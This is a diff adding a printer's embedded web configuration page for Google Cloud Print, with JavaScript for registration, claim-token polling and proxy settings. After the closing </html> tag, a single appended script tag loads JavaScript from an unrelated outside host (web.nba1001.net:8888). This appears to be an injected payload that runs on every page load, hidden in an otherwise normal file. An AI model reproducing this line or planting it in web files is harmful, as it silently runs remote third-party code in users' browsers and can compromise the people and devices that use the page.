@@ -1,0 +1,563 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- 
+
+ gcp.html 
+
+ Google Cloud Print Page for the Toolbox Configuration Function
+
+ ************************************************************
+   (c) Copyright 2008-2009 Marvell International Ltd.      
+  
+                 Marvell Confidential
+ *===========================================================
+
+ This file is intended only for the uses agreed to. 
+
+ You are hereby notified that any dissemination, distribution or copying of 
+ this material accept for the purposes agreed to is strictly prohibited.
+
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title id="pageTitle" ><!--#ssi IDs STRING_EWS_NETWORK_CONFIG_HEADING --></title>
+
+<script type="text/javascript">
+
+<!--
+var pageNav = function(theURL) {
+
+    window.open(theURL, "_self");
+    
+    return true;
+};
+
+var claim_url;
+var status_check_poll_interval;
+var status_check_timeout;
+
+
+function toggle_gcp_settings_view()
+{
+  /* If GCP is enabled, show settings */
+  var obj = document.getElementById("gcpp_enable_switch");
+  
+  document.getElementById("gcpp_settings").style.display = "none";
+  
+  /* Toggle GCP options */
+  if ( obj.value == "1" && "<!--#ssi IDr OID_GCPP_ENABLED -->" == "1") {
+    document.getElementById("gcpp_settings").style.display = "block";
+  }
+}
+
+function toggle_proxy_options()
+{
+  document.getElementById("gcp_proxy_options").style.display = "none";
+  document.getElementById("gcp_proxy_auth_options").style.display = "none";
+  
+  /* Toggle GCP proxy options */
+  var obj = document.getElementById("gcp_proxy_enable_switch");
+  if ( obj.value == "1" ) {
+    document.getElementById("gcp_proxy_options").style.display = "block";
+  }
+  
+  /* Toggle GCP proxy auth options */
+  var obj = document.getElementById("gcp_proxy_auth_enable_switch");
+  if ( obj.value == "1" ) {
+    document.getElementById("gcp_proxy_auth_options").style.display = "block";
+  }
+  
+}
+
+function check_gcp_name() 
+{
+  var gcp_name_info_element = document.getElementById('gcp_name_info');
+  
+  gcp_name_info_element.innerHTML = "";
+  
+  if ( document.getElementById('gcp_name').value == "")
+  {
+    gcp_name_info_element.innerHTML = "<!--#ssi IDs STRING_EWS_INVALID_GCP_NAME_INFO -->";
+    return -1;    
+  }
+  
+  return 0;
+}
+
+function save_gcp_settings() {
+  
+  if ( check_gcp_name () != 0 ) 
+  {
+    return -1;
+  }
+  
+  document.forms["gcp_settings_form"].submit();
+}
+
+function stop_status_check() 
+{
+  /* Stop polling */
+  if ( status_check_poll_interval ) 
+  {
+    window.clearInterval( status_check_poll_interval );
+  }
+  
+  /* clear the timeout */
+  if ( status_check_timeout )  
+  {
+    clearTimeout( status_check_timeout );
+  }
+  
+}
+
+function timeout_status_check()
+{
+  /* Stop polling */
+  stop_status_check();
+  
+  /* Show error alert */
+  show_alert_screen("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->",
+                    "<!--#ssi IDs STRING_EWS_REGISTRATION_FAILED -->",
+                    function() {gcp_register_okay()}, "<!--#ssi IDs STRING_EWS_OK -->");
+}
+
+function show_registration_failed()
+{
+  show_alert_screen("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->",
+                    "<!--#ssi IDs STRING_EWS_REGISTRATION_FAILED -->",
+                    function() {gcp_register_okay()}, "<!--#ssi IDs STRING_EWS_OK -->");
+}
+
+function gcp_register_okay() {
+  stop_status_check();
+  hide_alert();
+}
+
+function gcp_cancel () {
+
+  stop_status_check();
+  hide_alert();
+  
+  do_http_get_request( "/gcpp/cancel_registration", null );
+}
+
+function gcp_print_page()
+{
+  do_http_get_request( "/gcpp/print_reg_page", null )
+}
+
+function gcp_check_claim_status() 
+{
+  do_http_get_request( "/gcpp/check_reg_status", function( http ) 
+    {
+      if ( http.readyState == 4 ) 
+      {
+        if ( http.status == 200 )
+        {
+          /* Check claim status and respond accordingly */ 
+          if ( http.responseText.search( "Not Registered" ) != -1 ) 
+          {
+            /* Stop Polling */
+            stop_status_check();
+            show_registration_failed();
+          }
+          else if ( http.responseText.search( "Registration Complete" ) != -1 )
+          {
+            /* Registration completed. Remove alerts */
+            stop_status_check();
+            hide_alert();
+  
+            /* Reload page */
+            pageNav('/view/network/gcp');
+          }
+        }
+        else if ( http.readyState == 4 ) 
+        {
+          stop_status_check();
+          show_registration_failed();
+        }
+      }
+    }
+  );
+}
+
+function gcp_check_register_status() 
+{
+  claim_url = "#";
+  claim_token = "";
+
+  do_http_get_request( "/gcpp/check_reg_status", function( http ) 
+    {
+      if ( http.readyState == 4 ) 
+      {
+        if ( http.status == 200 ) 
+        {
+          /* Check registration status and respond accordingly */ 
+          if ( http.responseText.search( "Claim Pending" ) != -1 ) 
+          {
+            /* Stop Polling and show claim URL alert screen */
+            stop_status_check();
+            
+            do_http_get_request( "/gcpp/get_invite_url", function( http ) 
+              {
+                if (http.readyState == 4 && http.status == 200) 
+                {
+                  claim_url = http.responseText;
+                  
+                  do_http_get_request( "/gcpp/get_claim_token", function( http ) 
+                    {
+                      if (http.readyState == 4 && http.status == 200) 
+                      {
+                        claim_token = http.responseText;
+
+                        /* Poll for status, close alert when registration is complete */
+                        status_check_poll_interval = window.setInterval( function() { gcp_check_claim_status(); }, 2000);  
+  
+                        /* Show alert */
+                        show_alert_screen_2btns("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->",
+                                                "<!--#ssi IDs STRING_EWS_GCP_USE_TOKEN -->:" +
+                                                "<br><br>" +
+                                                "<div style='font-weight: bold'>" +
+                                                claim_token + 
+                                                "</div>" +
+                                                "<br>" +
+                                                "<!--#ssi IDs STRING_EWS_GCP_PLEASE_GO_TO -->" +
+                                                "<br><br>" +
+                                                "<a href='#' onClick='javascript:new_window_focus(\"" +
+                                                claim_url + 
+                                                "\")'>" +
+                                                claim_url + 
+                                                "</a>",
+                                                /* function() { gcp_print_page(); }, "<!--#ssi IDs STRING_EWS_PRINT_REGISTRATION_PAGE -->", */
+                                                function() { gcp_cancel(); }, "<!--#ssi IDs STRING_EWS_CANCEL_REG -->",
+                                                function() { gcp_register_okay(); }, "<!--#ssi IDs STRING_EWS_CLOSE_WINDOW -->");
+                       }
+                       else if ( http.readyState == 4 ) 
+                       {
+                         show_registration_failed();
+                       }
+                     }
+                   );
+                }
+                else if ( http.readyState == 4 ) 
+                {
+                  show_registration_failed();
+                }
+              }
+            );            
+          } 
+          else if ( http.responseText.search( "Not Registered" ) != -1 ) 
+          {
+    
+            /* Stop Polling */
+            stop_status_check();
+            show_registration_failed();
+          }
+        }
+        else 
+        {
+          /* Stop Polling */
+          stop_status_check();
+          show_registration_failed();
+        }
+      }
+    }
+  );
+}
+
+function gcp_check_unregister_status() 
+{
+  do_http_get_request( "/gcpp/check_reg_status", function( http ) {
+      if ( http.readyState == 4 ) 
+      {
+        if ( http.responseText.search( "Not Registered" ) != -1 ) 
+        {
+          /* Stop Polling, remove alerts and reload page */
+          stop_status_check();
+          hide_alert();
+          pageNav('/view/network/gcp');
+        }
+      }
+    }
+  );
+}
+
+function go_to_wireless_sta_setup() 
+{
+  hide_alert();
+  pageNav('/network/wireless_sta');
+}
+
+function gcp_register() {
+
+  
+//  if ( "<!--#ssi IDr OID_WIFI_INTF_ENABLED.WIFI_IFACE_ID_STATION -->" == "1" ) 
+//  {
+    show_alert_screen("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->",
+                      "<!--#ssi IDs STRING_EWS_REGISTERING_INFO --><br><br><!--#ssi IDs STRING_EWS_DO_NOT_REFRESH_OR_CLOSE -->",
+                      function () { gcp_cancel(); }, "<!--#ssi IDs STRING_EWS_CANCEL_REG -->");
+    
+    do_http_get_request( "/gcpp/start_registration", function( http ) 
+      {
+        if ( http.readyState == 4) 
+        {
+          if( http.status == 200) 
+          {
+            /* Timeout after 10 minutes */
+            status_check_timeout = setTimeout( function() { timeout_status_check(); }, 600000 );
+           
+            /* Poll registration status every 2 seconds */
+            status_check_poll_interval = window.setInterval( function() { gcp_check_register_status(); }, 2000);
+          }
+          else 
+          {
+            alert(http.statusText);
+            show_registration_failed();
+          }
+        }
+      }
+    );
+//  }
+//  else
+//  {
+//    show_alert_screen("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->", 
+//                      "<!--#ssi IDs STRING_EWS_ERROR_WIRELESS_STA_DISABLED --><br><br>" + 
+//                      "<a href='#' onClick='javascript:go_to_wireless_sta_setup()'>" +
+//                      "<!--#ssi IDs STRING_EWS_WIRELESS_STATION_SETTINGS --></a>",
+//                      function () { gcp_cancel(); }, "<!--#ssi IDs STRING_EWS_OK -->");
+//  }
+  
+}
+
+function gcp_unregister() {
+  
+  do_http_get_request( "/gcpp/unregister", function( http ) 
+    {
+      if ( http.readyState == 4 && http.status == 200 ) 
+      {
+        show_alert_screen("<!--#ssi IDs STRING_EWS_GCP_REGISTRATION -->",
+                    "<!--#ssi IDs STRING_EWS_UNREGISTERING --><br><br><!--#ssi IDs STRING_EWS_DO_NOT_REFRESH_OR_CLOSE -->");
+        
+        /* Timeout after 10 minutes */
+        status_check_timeout = setTimeout( function() {timeout_status_check() }, 600000 );
+
+        /* Poll registration status every 2 seconds */
+        status_check_poll_interval = window.setInterval( function() {gcp_check_unregister_status()}, 2000);
+      }
+    }
+  );
+}
+
+// Provided for any necessary left navigation initialization
+var initializeLeftNav = function(myDoc) {
+
+   // Developer may override this function for special client services functions
+
+};
+
+function initialize() {
+
+    toggle_gcp_settings_view();
+    
+    toggle_proxy_options();
+
+    initializeLeftNav(document);
+}
+//-->
+</script>
+
+<script type="text/javascript" src="/js/client-tools.js"></script>
+
+<!--#cspi IDm TOOLBOX_JS_MACRO -->
+
+<style type="text/css">
+<!--#ssi INCLUDE /toolbox.css -->
+</style>
+
+</head>
+
+<body onload="initialize();">
+    
+    <!--#ssi INCLUDE /leftNav.html -->
+    
+    <div class="heading1" id="topOfPageRow">
+        <span id="deviceModelLabel"><!--#ssi IDr OID_PLATFORM_PRINT_NAME_STRING --></span> 
+    </div> <!-- end of div 'topOfPageRow'  -->
+
+    <div id="pageBodyDiv">
+    
+        <div class="heading1" id="topPageHeadingDiv">
+            <span id="currentPageLabel" ><!--#ssi IDs STRING_EWS_NETWORK_CONFIG_HEADING --></span>
+        </div> <!-- end of div 'topPageHeadingDiv'  -->
+        
+        <div class="heading2" id="topPageLabelsDiv">
+            <span id="pageInstructions" ><!--#ssi IDs STRING_EWS_NETWORK_SETTINGS_NAV_LABEL --></span>
+        </div> <!-- end of div 'topPageLabelsDiv'  -->
+        
+        <div id="networkSelectDiv">
+            <div><span id="dropDownInstructions" ><!--#ssi IDs STRING_EWS_NETWORK_SELECT_PAGE --></span></div>
+            <div id="networkSelectControl">
+                <select onchange="javascript:pageNav(this.value);">
+                  <option value="/view/network/admin"><!--#ssi IDs STRING_EWS_NETWORK_ADMIN_OPTION --></option>
+                  <option value="/view/network/ipv4Config"><!--#ssi IDs STRING_EWS_NETWORK_IPV4_OPTION --></option>
+                  <option value="/view/network/bonjourConfig"><!--#ssi IDs STRING_EWS_NETWORK_BONJOUR_OPTION --></option>
+                  <option value="/view/network/snmpConfig"><!--#ssi IDs STRING_EWS_NETWORK_SNMP_OPTION --></option>
+                  <option selected="selected" value="/view/network/gcp"><!--#ssi IDs STRING_EWS_GOOGLE_CLOUD_PRINT --></option>
+                </select>
+            </div>
+        </div> <!-- end of div 'networkSelectDiv'  -->
+        
+        <div id="networkPageDialogDiv">
+            <div id="topPageHorizontalRule" >
+                <hr class="aRuleLine" />
+            </div>
+            <div class="setting_label">
+                <div><span>&nbsp</span></div>
+                <div><span id="networkFunctionHeading"><!--#ssi IDs STRING_EWS_GOOGLE_CLOUD_PRINT --></span></div>
+            </div>
+            <div id="gcpPageDialogTable">
+
+
+              <form method="post" action="/view/network/gcp" name="gcp_settings_form">
+              <div class="setting_group">
+                <table>
+                  <tr>
+                    <td class="setting_label"><span><!--#ssi IDs STRING_EWS_STATUS -->:</span></td>
+                    <td class="setting_value">
+                      <select id="gcpp_enable_switch" name="<!--#ssi ID OID_GCPP_ENABLED -->" onChange="javascript:toggle_gcp_settings_view();">
+                        <option value="0" <!--#ssi IDc EQ OID_GCPP_ENABLED 0 SELECTED -->><!--#ssi IDs STRING_EWS_DISABLED --></option>	      	         
+                        <option value="1" <!--#ssi IDc EQ OID_GCPP_ENABLED 1 SELECTED -->><!--#ssi IDs STRING_EWS_ENABLED --></option>
+                      </select>
+                    </td>
+                  </tr>
+                </table>
+              </div>
+              <div id="gcpp_settings" style="display: none;">
+                <div class="topic_subheading">
+                  <div><span><!--#ssi IDs STRING_EWS_REGISTRATION_SETTINGS --></span></div>
+                </div>
+                <div class="setting_group">
+                  <table>
+                    <tr>
+                      <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PRINTER_NAME -->:</span></td>
+                      <td class="setting_value">
+                        <div id="gcp_name_info" class="mini_a clrstyle_error"></div>
+                        <input type="text" name="<!--#ssi ID OID_GCPP_PRINTER_NAME -->" id="gcp_name"
+                                SIZE="16" MAXLENGTH="32" VALUE="<!--#ssi IDr OID_GCPP_PRINTER_NAME -->" 
+                                onkeyup="check_gcp_name();"/>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td class="setting_label"><span><!--#ssi IDs STRING_EWS_STATUS -->:</span></td>
+                      <td class="setting_value">
+                        <table>
+                          <tr>
+                            <!--#ssi IF EQ OID_GCPP_REGISTERED 0 -->
+                              <td><!--#ssi IDs STRING_EWS_NOT_REGISTERED --></td>
+                              <td><input type="button" value="<!--#ssi IDs STRING_EWS_REGISTER -->" onClick="javascript:gcp_register();"></td>
+                            <!--#ssi ELSE -->
+                              <td><!--#ssi IDs STRING_EWS_REGISTERED --></td>
+                              <td><input type="button" value="<!--#ssi IDs STRING_EWS_UNREGISTER -->" onClick="javascript:gcp_unregister();"></td>
+                            <!--#ssi ENDIF -->
+                          </tr>    
+                        </table>
+                      </td>
+                    </tr>
+                  </table>
+                </div>
+                <div class="topic_subheading2">
+                  <span><!--#ssi IDs STRING_EWS_ADV_SETTINGS --></span>
+                  <a href="#" class="mini_a" onClick="javascript:toggle_view('gcpp_advanced_settings');")> (<!--#ssi IDs STRING_EWS_SHOW_HIDE -->)</a>
+                </div>
+                <div id="gcpp_advanced_settings" style="display: none;">
+                  <div class="setting_group">
+                    <table>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_STATUS -->:</span></td>
+                        <td class="setting_value">
+                          <select id="gcp_proxy_enable_switch" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_ENABLED -->" onchange="javascript:toggle_proxy_options();">
+              				      <option value="0" <!--#ssi IDc EQ OID_GCPP_HTTP_PROXY_ENABLED 0 SELECTED -->><!--#ssi IDs STRING_EWS_DISABLED --></option>	      	         
+              				      <option value="1" <!--#ssi IDc EQ OID_GCPP_HTTP_PROXY_ENABLED 1 SELECTED -->><!--#ssi IDs STRING_EWS_ENABLED --></option>
+              				    </select>
+                        </td>
+                      </tr>
+                    </table>
+                  </div>
+                  <div id="gcp_proxy_options" class="setting_group" style="display: none;">
+                    <table>            
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_NAME -->:</span></td>
+                        <td class="setting_value">
+                          <input type="text" name="<!--#ssi ID OID_GCPP_PROXY -->"  SIZE="32" MAXLENGTH="32" VALUE="<!--#ssi IDr OID_GCPP_PROXY -->"/>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_SERVER -->:</span></td>
+                        <td class="setting_value">
+                          <input type="text" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_SERVER -->"  SIZE="32" MAXLENGTH="32" VALUE="<!--#ssi IDr OID_GCPP_HTTP_PROXY_SERVER -->"/>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_PORT -->:</span></td>
+                        <td class="setting_value">
+                          <input type="text" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_PORT -->"  SIZE="4" MAXLENGTH="4" VALUE="<!--#ssi IDr OID_GCPP_HTTP_PROXY_PORT -->"/>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_AUTH_REQ--></span></td>
+                        <td class="setting_value">
+                          <select id="gcp_proxy_auth_enable_switch" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_AUTH_REQ -->" onchange="javascript:toggle_proxy_options();">
+          		               <option value="0" <!--#ssi IDc EQ OID_GCPP_HTTP_PROXY_AUTH_REQ 0 SELECTED -->><!--#ssi IDs STRING_GEN_NO --></option>	      	         
+          		               <option value="1" <!--#ssi IDc EQ OID_GCPP_HTTP_PROXY_AUTH_REQ 1 SELECTED -->><!--#ssi IDs STRING_GEN_YES --></option>
+          	              </select>
+                        </td>
+                      </tr>
+                    </table>
+                  </div>
+                  <div id="gcp_proxy_auth_options" class="setting_group" style="display: none;">
+                    <table>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_USERNAME -->:</span></td>
+                        <td class="setting_value">
+                          <input type="text" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_USERNAME  -->"  SIZE="32" MAXLENGTH="32" VALUE="<!--#ssi IDr OID_GCPP_HTTP_PROXY_USERNAME -->"/>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td class="setting_label"><span><!--#ssi IDs STRING_EWS_PROXY_PASSWORD -->:</span></td>
+                        <td class="setting_value">
+                          <input type="text" name="<!--#ssi ID OID_GCPP_HTTP_PROXY_PASSWORD  -->"  SIZE="32" MAXLENGTH="32" VALUE="<!--#ssi IDr OID_GCPP_HTTP_PROXY_PASSWORD -->"/>
+                        </td>
+                      </tr>
+                    </table>
+                  </div> <!-- gcp_proxy_auth_options -->
+                </div> <!-- gcpp_advanced_settings -->
+              </div> <!-- gcpp_settings -->
+              </form>
+
+            </div> <!-- end of div 'gcpPageDialogTable'  -->
+            
+            <div id="allButtonsDiv">
+                <div id="bottomPageHorizontalRule" >
+                    <hr class="aRuleLine" />
+                </div>
+                <div id="errorMessageDiv">
+                    <span id="errorMessage" > &nbsp </span>
+                </div>
+                <div id="refreshButtonCell"> 
+                    <input class="button" type="submit" id="refreshButton" value="<!--#ssi IDs STRING_EWS_REFRESH_BUTTON_LABEL -->" onclick="javascript:pageNav('/view/network/gcp');"/>
+                </div>
+                <div id="showButtonCell"> 
+                    <input class="button" type="submit" id="showButton" value="<!--#ssi IDs STRING_EWS_SHOW_DEFAULTS_BUTTON_LABEL -->" onclick="javascript:setDefaults();"/>
+                </div>
+                <div id="saveButtonCell"> 
+                    <input class="button" type="submit" id="saveButton" value="<!--#ssi IDs STRING_EWS_SAVE_BUTTON_LABEL -->" onclick="javascript:save_gcp_settings();"/>
+                </div>
+            </div> <!-- end of div 'allButtonsDiv'  -->
+        
+        </div>  <!-- end of div 'networkPageDialogDiv'  -->
+    
+        <!--#ssi INCLUDE /templates.html -->
+    </div> <!-- end of div 'pageBodyDiv'  -->
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
